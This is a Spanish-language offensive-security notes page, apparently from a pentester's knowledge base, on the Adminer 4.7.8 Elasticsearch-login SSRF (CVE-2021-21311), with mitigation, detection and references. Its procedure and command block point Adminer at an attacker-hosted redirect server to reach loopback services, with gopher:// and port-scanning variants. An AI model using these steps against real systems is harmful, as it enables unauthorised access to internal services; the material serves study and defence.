---
topic: Adminer — SSRF en el login de Elasticsearch (CVE-2021-21311)
tags: [web, adminer, ssrf, elasticsearch, pivot]
---

# Adminer — SSRF en el login de Elasticsearch (CVE-2021-21311)

[🌐 English](adminer-ssrf.en.md) | **Español**

## Concepto

Adminer 4.7.8 permite que el campo de servidor del login de Elasticsearch inicie una petición desde el servidor. Un atacante aloja un endpoint que responde con un `301` hacia un destino interno; Adminer sigue la redirección y devuelve el resultado. Es un SSRF útil para descubrir y atacar servicios ligados a loopback.

## Cuándo aplica

- Adminer está expuesto y el login de Elasticsearch está disponible.
- El servidor puede resolver o alcanzar el host atacante y seguir redirecciones.
- Hay servicios internos como bases de datos, paneles o APIs que no se ven desde fuera.

## Procedimiento

1. Confirmar la versión de Adminer y el módulo de Elasticsearch.
2. Levantar un servidor propio que responda `301 Location: http://127.0.0.1:<PUERTO>/...`.
3. Introducir la IP del atacante en el campo de servidor y enviar el login.
4. Leer la respuesta y repetir con distintos puertos y rutas para enumerar el interior.

## Comandos

```bash
python3 -m http.server 80
# En otra terminal, responder 301 hacia el destino interno
curl -i "http://<HOST>/adminer.php?server=<ATTACKER>&username=x&password=x&auth[driver]=elastic"
curl -s "http://127.0.0.1:4242/api/version"
```

## Variantes

- Redirección a `gopher://` para enviar una petición HTTP completa a un servicio que no habla HTTP.
- Cambiar el `Location` a un rango de puertos para construir un escáner interno.
- Usar un dominio propio con DNS wildcard para evitar filtros por IP.

## Limitaciones

- Adminer debe poder conectar al atacante; un egress firewall lo impide.
- Algunos módulos no siguen redirecciones o limitan el esquema.
- El SSRF devuelve la respuesta, pero no siempre permite métodos distintos de GET.

## Mitigación

- Actualizar Adminer y deshabilitar drivers que no se usen.
- Restringir el egress del servidor y bloquear loopback desde componentes web.
- Exigir autenticación y segmentar los servicios de administración.

## Detección

- Peticiones salientes desde el servidor web hacia hosts no habituales.
- Códigos `301` seguidos de conexiones a `127.0.0.1` en el mismo flujo.
- Accesos a Adminer con parámetros `server` que no son bases conocidas.

## Referencias

- [0xdf — AdmirerToo](https://0xdf.gitlab.io/2022/05/28/htb-admirertoo.html)
- [NVD — CVE-2021-21311](https://nvd.nist.gov/vuln/detail/CVE-2021-21311)
- [CWE-918 — Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
